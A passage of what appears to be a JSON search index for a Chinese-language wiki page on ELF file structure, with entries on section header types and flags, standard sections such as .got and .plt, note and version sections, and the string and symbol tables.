\u4f5c\u4e3a\u4e00\u4e2a\u5b8c\u6574\u7684\u7b26\u53f7\u8868\uff0c\u5b83\u53ef\u80fd\u5305\u542b\u5f88\u591a\u5bf9\u52a8\u6001\u94fe\u63a5\u800c\u8a00\u4e0d\u5fc5  \u8981\u7684\u7b26\u53f7\u3002\u56e0\u6b64\uff0c\u76ee\u6807\u6587\u4ef6\u4e5f\u53ef\u4ee5\u5305\u542b\u4e00\u4e2a SHT_DYNSYM  \u8282\u533a\uff0c\u5176\u4e2d\u4fdd\u5b58\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u7684\u4e00\u4e2a\u6700\u5c0f\u96c6\u5408\uff0c\u4ee5\u8282\u7701\u7a7a\u95f4\u3002    SHT_LOPROC  0X70000000  \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u4e0b\u754c\uff08  LOw PROCessor-specific semantics  \uff09\u3002    SHT_HIPROC  OX7FFFFFFF  \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u4e0a\u754c\uff08  HIgh PROCessor-specific semantics  \uff09\u3002    SHT_LOUSER  0X80000000  \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u7d22\u5f15\u4e0b\u754c\u3002    SHT_HIUSER  0X8FFFFFFF  \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u7d22\u5f15\u4e0a\u754c\u3002", 
            "title": "sh_type"
        }, 
        {
            "location": "/executable/elf/elf_structure/#sh_flags", 
            "text": "\u8282\u5934\u4e2d  sh_flags   \u5b57\u6bb5\u7684\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u90fd\u53ef\u4ee5\u7ed9\u51fa\u5176\u76f8\u5e94\u7684\u6807\u8bb0\u4fe1\u606f\uff0c\u5176\u5b9a\u4e49\u4e86\u5bf9\u5e94\u7684\u8282\u533a\u7684\u5185\u5bb9\u662f\u5426\u53ef\u4ee5\u88ab\u4fee\u6539\u3001\u88ab\u6267\u884c\u7b49\u4fe1\u606f\u3002\u5982\u679c\u4e00\u4e2a\u6807\u5fd7\u4f4d\u88ab\u8bbe\u7f6e\uff0c\u5219\u8be5\u4f4d\u53d6\u503c\u4e3a1\uff0c\u672a\u5b9a\u4e49\u7684\u4f4d\u90fd\u4e3a0\u3002\u76ee\u524d\u5df2\u5b9a\u4e49\u503c\u5982\u4e0b\uff0c\u5176\u4ed6\u503c\u4fdd\u7559\u3002     \u540d\u79f0  \u503c  \u8bf4\u660e      SHF_WRITE  0x1  \u8fd9\u79cd\u8282\u5305\u542b\u4e86\u8fdb\u7a0b\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u88ab\u5199\u7684\u6570\u636e\u3002    SHF_ALLOC  0x2  \u8fd9\u79cd\u8282\u5728\u8fdb\u7a0b\u8fd0\u884c\u65f6\u5360\u7528\u5185\u5b58\u3002\u5bf9\u4e8e\u4e0d\u5360\u7528\u76ee\u6807\u6587\u4ef6\u7684\u5185\u5b58\u955c\u50cf\u7a7a\u95f4\u7684\u67d0\u4e9b\u63a7\u5236\u8282\uff0c\u8be5\u5c5e\u6027\u5904\u4e8e\u5173\u95ed\u72b6\u6001(off)\u3002    SHF_EXECINSTR  0x4  \u8fd9\u79cd\u8282\u5305\u542b\u53ef\u6267\u884c\u7684\u673a\u5668\u6307\u4ee4\uff08 EXECutable INSTRuction \uff09\u3002    SHF_MASKPROC  0xf0000000  \u6240\u6709\u5728\u8fd9\u4e2a\u63a9\u7801\u4e2d\u7684\u6bd4\u7279\u4f4d\u7528\u4e8e\u7279\u5b9a\u5904\u7406\u5668\u8bed\u4e49\u3002", 
            "title": "sh_flags"
        }, 
        {
            "location": "/executable/elf/elf_structure/#sh_link-sh_info", 
            "text": "\u5f53\u8282\u533a\u7c7b\u578b\u7684\u4e0d\u540c\u7684\u65f6\u5019\uff0csh_link \u548c sh_info \u4e5f\u4f1a\u5177\u6709\u4e0d\u540c\u7684\u542b\u4e49\u3002     sh_type  sh_link  sh_info      SHT_DYNAMIC  \u8282\u533a\u4e2d\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u8868\u7684\u8282\u5934\u7d22\u5f15  0    SHT_HASH  \u6b64\u54c8\u5e0c\u8868\u6240\u4f7f\u7528\u7684\u7b26\u53f7\u8868\u7684\u8282\u5934\u7d22\u5f15  0    SHT_REL/SHT_RELA  \u4e0e\u7b26\u53f7\u8868\u76f8\u5173\u7684\u7684\u8282\u5934\u7d22\u5f15  \u91cd\u5b9a\u4f4d\u5e94\u7528\u5230\u7684\u8282\u7684\u8282\u5934\u7d22\u5f15    SHT_SYMTAB/SHT_DYNSYM  \u64cd\u4f5c\u7cfb\u7edf\u7279\u5b9a\u4fe1\u606f\uff0cLinux \u4e2d\u7684 ELF \u6587\u4ef6\u4e2d\u8be5\u9879\u6307\u5411\u7b26\u53f7\u8868\u4e2d\u7b26\u53f7\u6240\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u8282\u533a\u5728 Section Header Table \u4e2d\u7684\u504f\u79fb\u3002  \u64cd\u4f5c\u7cfb\u7edf\u7279\u5b9a\u4fe1\u606f    other  SHN_UNDEF  0", 
            "title": "sh_link &amp; sh_info"
        }, 
        {
            "location": "/executable/elf/elf_structure/#sections", 
            "text": "\u8282\u533a\u5305\u542b\u76ee\u6807\u6587\u4ef6\u4e2d\u9664\u4e86 ELF \u5934\u90e8\u3001\u7a0b\u5e8f\u5934\u90e8\u8868\u3001\u8282\u533a\u5934\u90e8\u8868\u7684\u6240\u6709\u4fe1\u606f\u3002\u8282\u533a\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6   \u6bcf\u4e2a\u8282\u533a\u90fd\u6709\u5bf9\u5e94\u7684\u8282\u5934\u6765\u63cf\u8ff0\u5b83\u3002\u4f46\u662f\u53cd\u8fc7\u6765\uff0c\u8282\u533a\u5934\u90e8\u5e76\u4e0d\u4e00\u5b9a\u4f1a\u5bf9\u5e94\u7740\u4e00\u4e2a\u8282\u533a\u3002  \u6bcf\u4e2a\u8282\u533a\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u662f\u8fde\u7eed\u7684\uff0c\u4f46\u662f\u5927\u5c0f\u53ef\u80fd\u4e3a 0\u3002  \u4efb\u610f\u4e24\u4e2a\u8282\u533a\u4e0d\u80fd\u91cd\u53e0\uff0c\u5373\u4e00\u4e2a\u5b57\u8282\u4e0d\u80fd\u540c\u65f6\u5b58\u5728\u4e8e\u4e24\u4e2a\u8282\u533a\u4e2d\u3002  \u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u80fd\u4f1a\u6709\u95f2\u7f6e\u7a7a\u95f4\uff08inactive space\uff09\uff0c\u5404\u79cd\u5934\u548c\u8282\u4e0d\u4e00\u5b9a\u4f1a\u8986\u76d6\u5230\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5b57\u8282\uff0c \u95f2\u7f6e\u533a\u57df\u7684\u5185\u5bb9\u672a\u6307\u5b9a \u3002   \u8bb8\u591a\u5728 ELF \u6587\u4ef6\u4e2d\u7684\u8282\u90fd\u662f\u9884\u5b9a\u4e49\u7684\uff0c\u5b83\u4eec\u5305\u542b\u7a0b\u5e8f\u548c\u63a7\u5236\u4fe1\u606f\u3002\u8fd9\u4e9b\u8282\u88ab\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\uff0c\u4f46\u662f\u5bf9\u4e8e\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u540c\u4e00\u8282\u533a\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u7684\u7c7b\u578b\u4ee5\u53ca\u5c5e\u6027\u3002  \u53ef\u6267\u884c\u6587\u4ef6\u662f\u7531\u94fe\u63a5\u5668\u5c06\u4e00\u4e9b\u5355\u72ec\u7684\u76ee\u6807\u6587\u4ef6\u4ee5\u53ca\u5e93\u6587\u4ef6\u94fe\u63a5\u8d77\u6765\u800c\u5f97\u5230\u7684\u3002\u5176\u4e2d\uff0c\u94fe\u63a5\u5668\u4f1a\u89e3\u6790\u5f15\u7528\uff08\u4e0d\u540c\u6587\u4ef6\u4e2d\u7684\u5b50\u4f8b\u7a0b\u7684\u5f15\u7528\u4ee5\u53ca\u6570\u636e\u7684\u5f15\u7528\uff0c\u8c03\u6574\u5bf9\u8c61\u6587\u4ef6\u4e2d\u7684\u7edd\u5bf9\u5f15\u7528\uff09\u5e76\u4e14\u91cd\u5b9a\u4f4d\u6307\u4ee4\u3002\u52a0\u8f7d\u4e0e\u94fe\u63a5\u8fc7\u7a0b\u9700\u8981\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u4f1a\u5c06\u5904\u7406\u540e\u7684\u4fe1\u606f\u5b58\u50a8\u5728\u4e00\u4e9b\u7279\u5b9a\u7684\u8282\u533a\u4e2d\uff0c\u6bd4\u5982  .dynamic  \u3002  \u6bcf\u4e00\u79cd\u64cd\u4f5c\u7cfb\u7edf\u90fd\u4f1a\u652f\u6301\u4e00\u7ec4\u94fe\u63a5\u6a21\u578b\uff0c\u4f46\u8fd9\u4e9b\u6a21\u578b\u90fd\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd     \u7c7b\u578b  \u63cf\u8ff0      \u9759\u6001\u94fe\u63a5  \u9759\u6001\u94fe\u63a5\u7684\u6587\u4ef6\u4e2d\u6240\u4f7f\u7528\u7684\u5e93\u6587\u4ef6\u6216\u8005\u7b2c\u4e09\u65b9\u5e93\u90fd\u88ab\u9759\u6001\u7ed1\u5b9a\u4e86\uff0c\u5176\u5f15\u7528\u5df2\u7ecf\u88ab\u89e3\u6790\u4e86\u3002    \u52a8\u6001\u94fe\u63a5  \u52a8\u6001\u94fe\u63a5\u7684\u6587\u4ef6\u4e2d\u6240\u4f7f\u7528\u7684\u5e93\u6587\u4ef6\u6216\u8005\u7b2c\u4e09\u65b9\u5e93\u53ea\u662f\u5355\u7eaf\u5730\u88ab\u94fe\u63a5\u5230\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u3002\u5f53\u53ef\u6267\u884c\u6587\u4ef6\u6267\u884c\u65f6\u4f7f\u7528\u5230\u76f8\u5e94\u51fd\u6570\u65f6\uff0c\u76f8\u5e94\u7684\u51fd\u6570\u5730\u5740\u624d\u4f1a\u88ab\u89e3\u6790\u3002     \u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u8282\u53ef\u4ee5\u652f\u6301\u8c03\u8bd5\uff0c\u6bd4\u5982\u8bf4 .debug \u4ee5\u53ca .line \u8282\uff1b\u652f\u6301\u7a0b\u5e8f\u63a7\u5236\u7684\u8282\u6709 .bss\uff0c.data\uff0c .data1\uff0c .rodata\uff0c .rodata1\u3002     \u540d\u79f0  \u7c7b\u578b  \u5c5e\u6027  \u542b\u4e49      .comment  SHT_PROGBITS   \u5305\u542b\u7248\u672c\u63a7\u5236\u4fe1\u606f\u3002    .debug  SHT_PROGBITS   \u6b64\u8282\u533a\u5305\u542b\u7528\u4e8e\u7b26\u53f7\u8c03\u8bd5\u7684\u4fe1\u606f\u3002    .dynamic  SHT_DYNAMIC  SHF_ALLOC  SHF_WRITE  \u6b64\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u4fe1\u606f\u3002SHF_WRITE \u4f4d\u8bbe\u7f6e\u4e0e\u5426\u662f\u5426\u88ab\u8bbe\u7f6e\u53d6\u51b3\u4e8e\u5177\u4f53\u7684\u5904\u7406\u5668\u3002    .dynstr  SHT_STRTAB  SHF_ALLOC  \u6b64\u8282\u533a\u5305\u542b\u7528\u4e8e\u52a8\u6001\u94fe\u63a5\u7684\u5b57\u7b26\u4e32\uff0c\u5927\u591a\u6570 \u60c5\u51b5\u4e0b\u8fd9\u4e9b\u5b57\u7b26\u4e32\u4ee3\u8868\u4e86\u4e0e\u7b26\u53f7\u8868\u9879\u76f8\u5173\u7684\u540d\u79f0\u3002    .dynsym  SHT_DYNSYM  SHF_ALLOC  \u6b64\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u3002    .got  SHT_PROGBITS   \u6b64\u8282\u533a\u5305\u542b\u5168\u5c40\u504f\u79fb\u8868\u3002    .line  SHT_PROGBITS   \u6b64\u8282\u533a\u5305\u542b\u7b26\u53f7\u8c03\u8bd5\u7684\u884c\u53f7\u4fe1\u606f\uff0c\u63cf\u8ff0\u4e86\u6e90\u7a0b\u5e8f\u4e0e\u673a\u5668\u6307\u4ee4\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u5176\u5185\u5bb9\u662f\u672a\u5b9a\u4e49\u7684\u3002    .plt  SHT_PROGBITS   \u6b64\u8282\u533a\u5305\u542b\u8fc7\u7a0b\u94fe\u63a5\u8868\uff08procedure  linkage  table\uff09\u3002    .relname  SHT_REL   \u8fd9\u4e9b\u8282\u533a\u4e2d\u5305\u542b\u91cd\u5b9a\u4f4d\u4fe1\u606f\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u5305\u542b\u53ef\u52a0\u8f7d\u7684\u6bb5\uff0c\u6bb5\u4e2d\u6709\u91cd\u5b9a\u4f4d\u5185\u5bb9\uff0c\u8282\u533a\u7684\u5c5e\u6027\u5c06\u5305\u542bSHF_ALLOC\u4f4d\uff0c\u5426\u5219\u8be5\u4f4d\u7f6e 0\u3002\u4f20\u7edf\u4e0a name \u6839\u636e\u91cd\u5b9a\u4f4d\u6240\u9002\u7528\u7684\u8282\u533a\u7ed9\u5b9a\u3002\u4f8b\u5982 .text \u8282\u533a\u7684\u91cd\u5b9a\u4f4d\u8282\u533a\u540d\u5b57\u5c06\u662f\uff1a.rel.text \u6216\u8005 .rela.text\u3002    .relaname  SHT_RELA      .shstrtab  SHT_STRTAB   \u6b64\u8282\u533a\u5305\u542b\u8282\u533a\u540d\u79f0\u3002     \u6ce8\u610f\uff1a   \u4ee5 \u201c.\u201d \u5f00\u5934\u7684\u8282\u533a\u540d\u79f0\u662f\u7cfb\u7edf\u4fdd\u7559\u7684\uff0c\u5f53\u7136\u5e94\u7528\u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u8282\u533a\u3002\u4e3a\u4e86\u907f\u514d\u4e0e\u7cfb\u7edf\u8282\u533a\u51b2\u7a81\uff0c\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u5c3d\u91cf\u4f7f\u7528\u6ca1\u6709\u524d\u7f00\u7684\u8282\u533a\u540d\u79f0\u3002  \u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u5141\u8bb8\u5b9a\u4e49\u4e0d\u5728\u4e0a\u8ff0\u5217\u8868\u4e2d\u7684\u8282\u533a\uff0c\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u540d\u5b57\u76f8\u540c\u7684\u8282\u533a\u3002  \u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u7684\u8282\u533a\u540d\u79f0\u4e00\u822c\u547d\u540d\u89c4\u5219\u4e3a\uff1a\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u540d\u79f0\u7b80\u5199+ \u8282\u533a\u540d\u79f0\u3002\u5176\u4e2d\uff0c\u5904\u7406\u5668\u540d\u79f0\u5e94\u8be5\u4e0e e_machine \u4e2d\u4f7f\u7528\u7684\u540d\u79f0\u76f8\u540c\u3002\u4f8b\u5982 .FOO.psect \u8282\u533a\u662f FOO \u4f53\u7cfb\u7ed3\u6784\u4e2d\u7684 psect \u8282\u533a\u3002   \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5\u94fe\u63a5\u89c6\u56fe\u4e2d\u7684\u5206\u7c7b\u5373\u6bb5\u7c7b\u578b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u540c\u65f6\u4e5f\u4f1a\u52a0\u4e0a\u81ea\u5df1\u7684\u4e00\u4e9b\u7b80\u5355\u5206\u7c7b\u3002", 
            "title": "Sections"
        }, 
        {
            "location": "/executable/elf/elf_structure/#note-related-sections", 
            "text": "\u6709\u65f6\u5019\u751f\u4ea7\u5382\u5546\u6216\u8005\u7cfb\u7edf\u6784\u5efa\u8005\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u4e00\u4e9b\u7279\u6b8a\u7684\u4fe1\u606f\u6765\u6807\u8bb0ELF\u6587\u4ef6\uff0c\u4ece\u800c\u5176\u5b83\u7a0b\u5e8f\u53ef\u4ee5\u6765\u68c0\u67e5\u8be5ELF\u6587\u4ef6\u7684\u4e00\u81f4\u6027\u4ee5\u53ca\u517c\u5bb9\u6027\u3002\u8282\u533a\u7c7b\u578b\u4e3a SHT_NOTE \u6216\u8005\u7a0b\u5e8f\u5934\u90e8\u7c7b\u578b\u4e3a PT_NOTE \u7684\u5143\u7d20\u7528\u4e8e\u6765\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\uff0c\u5b83\u4eec\u4e2d\u5bf9\u8c61\u7684\u8868\u9879\u53ef\u80fd\u5305\u542b\u4e00\u5230\u591a\u4e2a\uff0c\u6bcf\u4e00\u4e2a\u8868\u9879\u90fd\u662f\u76ee\u6807\u5904\u7406\u5668\u683c\u5f0f\u7684 4 \u5b57\u8282\u6570\u7ec4\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u4e00\u4e9b\u53ef\u80fd\u7684\u6ce8\u91ca\u4fe1\u606f\u3002\u4f46\u662f\u8fd9\u5e76\u4e0d\u5728 ELF \u6587\u4ef6\u7684\u89c4\u8303\u5185\u3002    namesz\u4e0ename  name\u7684\u524dnamesz\u5b57\u8282\u5305\u542b\u4e86\u4e00\u4e2a\u4ee5NULL\u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u8868\u793a\u8be5\u9879\u7684\u62e5\u6709\u8005\u6216\u8005\u53d1\u8d77\u4eba\u3002\u4f46\u662f\u76ee\u524d\u5e76\u6ca1\u6709\u907f\u514d\u51b2\u7a81\u7684\u683c\u5f0f\u5316\u7684\u547d\u540d\u673a\u5236\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u751f\u4ea7\u5382\u5546\u4f1a\u4f7f\u7528\u4ed6\u4eec\u81ea\u5df1\u516c\u53f8\u7684\u540d\u5b57\uff0c\u4f8b\u5982\u201cXYZ Computer Company\u201d\u6765\u5f53\u505a\u5bf9\u5e94\u7684\u6807\u5fd7\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u540d\u5b57\u7684\u8bdd\uff0cnamesz\u5e94\u8be5\u662f0\u3002\u90a3\u4e48\u5728name\u7684\u5730\u65b9\u5e94\u8be5\u586b\u5145\u52304\u5b57\u8282\u5bf9\u9f50\u3002    descsz\u4e0edesc  desc\u7684\u524ddescsz\u5b57\u8282\u5305\u542b\u4e86\u6ce8\u91ca\u7684\u63cf\u8ff0\u3002ELF\u6587\u4ef6\u5bf9\u4e8e\u63cf\u8ff0\u7684\u5185\u5bb9\u6ca1\u6709\u4efb\u4f55\u7ea6\u675f\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u63cf\u8ff0\u7684\u8bdd\uff0cdescsz\u5e94\u8be5\u4e3a0\u3002\u5f53\u7136\uff0c\u5e94\u8be5\u5728desc\u5904\u586b\u5145\u52304\u5b57\u8282\u5bf9\u9f50\u3002    type  \u8fd9\u4e2a\u5b57\u6bb5\u7ed9\u51fa\u4e86\u63cf\u8ff0\u7684\u89e3\u91ca\uff0c\u5bf9\u4e8e\u4e0d\u540c\u90a3\u4e2a\u7684\u53d1\u8d77\u8005\u6765\u8bf4\uff0c\u4ed6\u4eec\u90fd\u5fc5\u987b\u63a7\u5236\u81ea\u5df1\u7684\u7c7b\u578b\uff0c\u5bf9\u4e8e\u540c\u4e00\u7c7b\u578b\u6765\u8bf4\uff0c\u6709\u53ef\u80fd\u6709\u591a\u4e2a\u63cf\u8ff0\u4e0e\u5176\u5bf9\u5e94\u3002\u56e0\u6b64\uff0c\u53d1\u8d77\u8005\u5fc5\u987b\u80fd\u591f\u8bc6\u522b\u540d\u5b57\u4ee5\u53ca\u7c7b\u578b\u4ee5\u4fbf\u4e8e\u6765\u7406\u89e3\u5bf9\u5e94\u7684\u63cf\u8ff0\u3002\u76ee\u524d\u6765\u8bf4\uff0c\u7c7b\u578b\u4e0d\u80fd\u591f\u4e3a\u975e\u8d1f\u503c\uff0cELF\u6587\u4ef6\u7684\u89c4\u8303\u91cc\u5e76\u4e0d\u5b9a\u4e49\u63cf\u8ff0\u7b26\u7684\u610f\u601d\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48type\u5728\u524d\u9762\u3002     \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u4e00\u4e0b   \u8fd9\u91cc\u5305\u542b\u4e86\u4e24\u4e2a\u8868\u9879\u3002  \u5728 Linux \u4e2d\uff0c\u4e0e Note \u76f8\u5173\u7684\u8282\u5305\u542b\u4e86 ELF \u6587\u4ef6\u4e2d\u7684\u4e00\u4e9b\u6ce8\u91ca\u4fe1\u606f\uff0c\u4e3b\u8981\u5305\u542b\u4e24\u4e2a\u8282   .note.ABI-tag  .note.gnu.build-id", 
            "title": "Note related sections"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_10", 
            "text": "", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/executable/elf/elf_structure/#version-releated-sections", 
            "text": "ELF \u6587\u4ef6\u4e0d\u4ec5\u53ef\u4ee5\u5bfc\u5165\u5916\u90e8\u7684\u7b26\u53f7\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u5bfc\u5165\u6307\u5b9a\u7248\u672c\u7684\u7b26\u53f7\u3002\u4f8b\u5982\uff0c\u5f53\u6211\u4eec\u53ef\u4ee5\u4ece GLIBC_2.2.5 \u4e2d\u5bfc\u5165\u5176\u4e2d\u7684\u4e00\u4e9b\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u6bd4\u5982 printf\u3002\u5176\u4e2d\uff0c.gnu.version_r \u4fdd\u5b58\u4e86\u7248\u672c\u7684\u5b9a\u4e49\uff0c\u5bf9\u5e94\u7684\u7ed3\u6784\u4f53\u662f Elf_Verdef\u3002  \u5982\u4e0b   .gnu.version\uff0cVersions of symbols.  .gnu.version_d\uff0cVersion definitions of symbols.  .gnu.version_r\uff0cVersion references (version needs) of symbols.", 
            "title": "version releated sections"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_11", 
            "text": "", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/executable/elf/elf_structure/#strtab-string-table", 
            "text": "\u8be5\u8282\u533a\u63cf\u8ff0\u9ed8\u8ba4\u7684\u5b57\u7b26\u4e32\u8868\uff0c\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002ELF \u6587\u4ef6\u4f7f\u7528\u8fd9\u4e9b\u5b57\u7b26\u4e32\u6765\u5b58\u50a8\u7a0b\u5e8f\u4e2d\u7684\u7b26\u53f7\u540d\uff0c\u5305\u62ec   \u53d8\u91cf\u540d  \u51fd\u6570\u540d   \u8be5\u8282\u5728\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\u4e0d\u9700\u8981\u52a0\u8f7d\uff0c\u53ea\u9700\u8981\u52a0\u8f7d\u5bf9\u5e94\u7684\u5b50\u96c6 .dynstr \u8282\u3002  \u4e00\u822c\u901a\u8fc7\u5bf9\u5b57\u7b26\u4e32\u7684\u9996\u4e2a\u5b57\u6bcd\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u7684\u4e0b\u6807\u6765\u7d22\u5f15\u5b57\u7b26\u4e32\u3002  \u5b57\u7b26\u4e32\u8868\u7684\u9996\u5c3e\u5b57\u8282\u90fd\u662fNULL\u3002\u6b64\u5916\uff0c\u7d22\u5f15\u4e3a0\u7684\u5b57\u7b26\u4e32\u8981\u4e48\u6ca1\u6709\u540d\u5b57\uff0c\u8981\u4e48\u5c31\u662f\u540d\u5b57\u4e3a\u7a7a\uff0c\u5176\u89e3\u91ca\u4f9d\u8d56\u4e8e\u4e0a\u4e0b\u6587\u3002\u5b57\u7b26\u4e32\u8868\u4e5f\u53ef\u4ee5\u4e3a\u7a7a\uff0c\u76f8\u5e94\u7684\uff0c\u5176\u8282\u533a\u5934\u90e8\u7684 sh_size \u6210\u5458\u5c06\u4e3a0\u3002\u5728\u7a7a\u5b57\u7b26\u4e32\u8868\u4e2d\u7d22\u5f15\u5927\u4e8e 0 \u7684\u4e0b\u6807\u663e\u7136\u662f\u975e\u6cd5\u7684\u3002  \u4e00\u4e2a\u8282\u533a\u5934\u90e8\u7684 sh_name \u6210\u5458\u7684\u503c\u4e3a\u5176\u76f8\u5e94\u7684\u8282\u533a\u5934\u90e8\u5b57\u7b26\u4e32\u8868\u8282\u533a\u7684\u7d22\u5f15\uff0c\u6b64\u8282\u533a\u7531 ELF \u5934\u7684 e_shstrndx \u6210\u5458\u7ed9\u51fa\u3002\u4e0b\u56fe\u7ed9\u51fa\u4e86\u4e00\u4e2a\u5305\u542b 25 \u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u4e32\u8868\uff0c\u4ee5\u53ca\u4e0e\u4e0d\u540c\u7d22\u5f15\u76f8\u5173\u7684\u5b57\u7b26\u4e32\u3002     \u7d22\u5f15  +0  +1  +2  +3  +4  +5  +6  +7  +8  +9      0  \\0  n  a  m  e  .  \\0  V  a  r    10  i  a  b  l  e  \\0  a  b  l  e    20  \\0  \\0  x  x  \\0          \u5176\u4e2d\u5305\u542b\u7684\u5b57\u7b26\u4e32\u6709     \u7d22\u5f15  \u5b57\u7b26\u4e32      0  none    1  name.    7  Variable    11  able    16  able    24  \u7a7a\u5b57\u7b26\u4e32     \u53ef\u4ee5\u770b\u51fa   \u5b57\u7b26\u4e32\u8868\u7d22\u5f15\u53ef\u4ee5\u5f15\u7528\u8282\u533a\u4e2d\u4efb\u610f\u5b57\u8282\u3002  \u5b57\u7b26\u4e32\u53ef\u4ee5\u51fa\u73b0\u591a\u6b21\u3002  \u53ef\u4ee5\u5b58\u5728\u5bf9\u5b50\u5b57\u7b26\u4e32\u7684\u5f15\u7528\u3002  \u540c\u4e00\u4e2a\u5b57\u7b26\u4e32\u53ef\u4ee5\u88ab\u5f15\u7528\u591a\u6b21\u3002  \u5b57\u7b26\u4e32\u8868\u4e2d\u4e5f\u53ef\u4ee5\u5b58\u5728\u672a\u5f15\u7528\u7684\u5b57\u7b26\u4e32\u3002   \u8fd9\u90e8\u5206\u4fe1\u606f\u5728\u8fdb\u884c  strip  \u540e\u5c31\u4f1a\u6d88\u5931\u3002", 
            "title": ".strtab: String Table"
        }, 
        {
            "location": "/executable/elf/elf_structure/#shstrtab-section-header-string-table", 
            "text": "\u8be5\u8282\u533a\u4e0e  .strtab  \u7684\u5b58\u50a8\u7ed3\u6784\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u8be5\u8282\u533a\u5b58\u50a8\u7684\u662f\u8282\u533a\u540d\u7684\u5b57\u7b26\u4e32\u3002", 
            "title": ".shstrtab: Section Header String Table"
        }, 
        {
            "location": "/executable/elf/elf_structure/#symtab-symbol-table", 
            "text": "", 
            "title": ".symtab: Symbol Table"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_12", 
            "text": "\u6bcf\u4e2a\u76ee\u6807\u6587\u4ef6\u90fd\u4f1a\u6709\u4e00\u4e2a\u7b26\u53f7\u8868\uff0c\u719f\u6089\u7f16\u8bd1\u539f\u7406\u7684\u5c31\u4f1a\u77e5\u9053\uff0c\u5728\u7f16\u8bd1\u7a0b\u5e8f\u65f6\uff0c\u5fc5\u987b\u6709\u76f8\u5e94\u7684\u7ed3\u6784\u6765\u7ba1\u7406\u7a0b\u5e8f\u4e2d\u7684\u7b26\u53f7\u4ee5\u4fbf\u4e8e\u5bf9\u51fd\u6570\u548c\u53d8\u91cf\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002  \u6b64\u5916\uff0c\u94fe\u63a5\u672c\u8d28\u5c31\u662f\u628a\u591a\u4e2a\u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u76f8\u4e92\u201c\u7c98\u201d\u5728\u4e00\u8d77\uff0c\u5b9e\u9645\u4e0a\uff0c\u76ee\u6807\u6587\u4ef6\u76f8\u4e92\u7c98\u5408\u662f\u76ee\u6807\u6587\u4ef6\u4e4b\u95f4\u5bf9\u5730\u5740\u7684\u5f15\u7528\uff0c\u5373\u51fd\u6570\u548c\u53d8\u91cf\u7684\u5730\u5740\u7684\u76f8\u4e92\u5f15\u7528\u3002\u800c\u5728\u7c98\u5408\u7684\u8fc7\u7a0b\u4e2d\uff0c\u7b26\u53f7\u5c31\u662f\u5176\u4e2d\u7684\u7c98\u5408\u5242\u3002  \u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\u8868\u5305\u542b\u4e86 \u4e00\u4e9b\u901a\u7528\u7684\u7b26\u53f7 \uff0c\u8fd9\u90e8\u5206\u4fe1\u606f\u5728\u8fdb\u884c\u4e86  strip  \u64cd\u4f5c\u540e\u5c31\u4f1a\u6d88\u5931\u3002\u5305\u62ec   \u53d8\u91cf\u540d  \u51fd\u6570\u540d   